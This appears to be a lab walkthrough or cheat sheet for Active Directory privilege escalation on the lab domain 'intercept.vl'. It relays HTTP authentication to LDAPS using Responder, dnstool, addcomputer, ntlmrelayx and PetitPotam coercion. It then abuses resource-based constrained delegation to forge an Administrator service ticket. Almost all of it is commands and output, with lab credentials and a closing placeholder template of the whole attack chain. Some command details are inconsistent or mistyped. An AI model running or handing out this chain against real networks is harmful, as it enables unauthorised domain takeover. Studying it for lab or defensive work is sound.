Relaying from HTTP to LDAP Privilege Escalation (RBCD)

Webdav in use:

```bash
nxc smb 10.13.38.50 -u Kathryn.Spencer -p Chocolate1 -M webdav
SMB         10.13.38.50     445    WS01             [*] Windows 10 / Server 2019 Build 19041 x64 (name:WS01) (domain:intercept.vl) (signing:False) (SMBv1:False) 
SMB         10.13.38.50     445    WS01             [+] intercept.vl\Kathryn.Spencer:Chocolate1 
WEBDAV      10.13.38.50     445    WS01             WebClient Service enabled on: 10.13.38.50
```

In Responders .conf file, turn off SMB and HTTP/HTTPS. Run Responder, take note of the `Machine Name`:

```bash
Responder -I tun0
[+] Current Session Variables:
    Responder Machine Name     [WIN-O98P9TGUQJA]
    Responder Domain Name      [RSTL.LOCAL]
    Responder DCE-RPC Port     [46993]
```

Add DNS record:

```bash
python3 /opt/krbrelayx/dnstool.py -u 'intercept\Kathryn.Spencer' -p Chocolate1 --record 'WIN-O98P9TGUQJA' --action add --data 10.10.14.8 --type A 10.13.38.49
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[-] Adding extra record
[+] LDAP operation completed successfully
```

Add Computer Account:

```bash
addcomputer.py intercept.vl/Kathryn.Spencer:Chocolate1 -computer-name MYCOMPUTER -computer-pass 'Password123' -dc-ip 10.13.38.49
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Successfully added machine account MYCOMPUTER$ with password Password123.
```

Configure NTLMRelayx:

```bash
sudo ntlmrelayx.py -t ldaps://10.13.38.49 -smb2support --delegate-access --escalate-user 'MYCOMPUTER$'
```

Use Petitpotam:

```
python3 /opt/PetitPotam/PetitPotam.py -d intercept.vl -u Kathryn.Spencer -p Chocolate1 'WIN-D9XMDD03UKV@80/random.txt' 10.13.38.50

                                                                                               
              ___            _        _      _        ___            _                     
             | _ \   ___    | |_     (_)    | |_     | _ \   ___    | |_    __ _    _ __   
             |  _/  / -_)   |  _|    | |    |  _|    |  _/  / _ \   |  _|  / _` |  | '  \  
            _|_|_   \___|   _\__|   _|_|_   _\__|   _|_|_   \___/   _\__|  \__,_|  |_|_|_| 
          _| """ |_|"""""|_|"""""|_|"""""|_|"""""|_| """ |_|"""""|_|"""""|_|"""""|_|"""""| 
          "`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-' 
                                         
              PoC to elicit machine account authentication via some MS-EFSRPC functions
                                      by topotam (@topotam77)
      
                     Inspired by @tifkin_ & @elad_shamir previous work on MS-RPRN



Trying pipe lsarpc
[-] Connecting to ncacn_np:10.13.38.50[\PIPE\lsarpc]
[+] Connected!
[+] Binding to c681d488-d850-11d0-8c52-00c04fd90f7e
[+] Successfully bound!
[-] Sending EfsRpcOpenFileRaw!
[-] Got RPC_ACCESS_DENIED!! EfsRpcOpenFileRaw is probably PATCHED!
[+] OK! Using unpatched function!
[-] Sending EfsRpcEncryptFileSrv!
[+] Got expected ERROR_BAD_NETPATH exception!!
[+] Attack worked!
```

Back in NTLMRelayx, we can now impersonate our target:

```bash
[*] Servers started, waiting for connections
[*] HTTPD(80): Client requested path: /random.txt/pipe/srvsvc
[*] HTTPD(80): Client requested path: /random.txt/pipe/srvsvc
[*] HTTPD(80): Connection from 10.13.38.50 controlled, attacking target ldaps://10.13.38.49
[*] HTTPD(80): Client requested path: /random.txt/pipe/srvsvc
[*] HTTPD(80): Authenticating against ldaps://10.13.38.49 as INTERCEPT/WS01$ SUCCEED
[*] Enumerating relayed user's privileges. This may take a while on large domains
[*] HTTPD(80): Client requested path: /random.txt/pipe/srvsvc
[*] HTTPD(80): Client requested path: /random.txt/pipe/srvsvc
[*] All targets processed!
[*] HTTPD(80): Connection from 10.13.38.50 controlled, but there are no more targets left!
[*] Delegation rights modified succesfully!
[*] MYCOMPUTER$ can now impersonate users on WS01$ via S4U2Proxy
```

Verify:

```bash
rbcd.py -delegate-from 'MYCOMPUTER$' -delegate-to 'WS01$' -dc-ip 10.13.38.49 -action 'read' 'intercept.vl/MYCOMPUTER$':'Password123'
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Accounts allowed to act on behalf of other identity:
[*]     MYCOMPUTER$   (S-1-5-21-3031021547-1480128195-3014128932-7612)
```

Create Service Ticket:

```bash
getST.py -spn 'cifs/ws01.intercept.vl' -impersonate Administrator -dc-ip 10.13.38.49 'intercept.vl/MYCOMPUTER$':'Password123'
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@cifs_ws01.intercept.vl@INTERCEPT.VL.ccache
```

Load ccache file:

```bash
export KRB5CCNAME=./Administrator@cifs_ws01.intercept.vl@INTERCEPT.VL.ccache
```

Verify:

```bash
klist
Ticket cache: FILE:./Administrator@cifs_ws01.intercept.vl@INTERCEPT.VL.ccache
Default principal: Administrator@intercept.vl

Valid starting     Expires            Service principal
14/02/26 15:30:15  15/02/26 01:30:15  cifs/ws01.intercept.vl@INTERCEPT.VL
	renew until 15/02/26 15:30:15
```

Verify administrative access:

```bash
nxc smb 10.13.38.50 --use-kcache 
SMB         10.13.38.50     445    WS01             [*] Windows 10 / Server 2019 Build 19041 x64 (name:WS01) (domain:intercept.vl) (signing:False) (SMBv1:False) 
SMB         10.13.38.50     445    WS01             [+] intercept.vl\Administrator from ccache (Pwn3d!)
```

Summary:

```bash
nxc smb <target> -u <user> -p <pass> -M webdav

Responder -I tun0

python3 dnstool.py -u '<domain>\<user>' -p <pass> --record '<Responder_Machine Name>' --action add --data <your_ip> --type A <dc_ip>

addcomputer.py <domain>/<user>:<pass> -computer-name MYCOMPUTER -computer-pass 'Password123' -dc-ip <dc_ip>

sudo ntlmrelayx.py -t ldaps://<dc_ip> -smb2support --delegate-access --escalate-user 'MYCOMPUTER$

python3 PetitPotam.py -d <domain> -u <user> -p <pass> '<Responder_Machine Name>80/random.txt' <target>

rbcd.py -delegate-from 'MYCOMPUTER$' -delegate-to '<target_computer_account>$' -dc-ip <dc_ip -action 'read' '<domain>/MYCOMPUTER$':'Password123'

getST.py -spn 'cifs/<target_computer_account>.<domain>' -impersonate Administrator -dc-ip <dc_ip> '<domain>/MYCOMPUTER$':'Password123'

export KRB5CCNAME=./<ccache_file>

klist

nxc smb <target> --use-kcache 
```
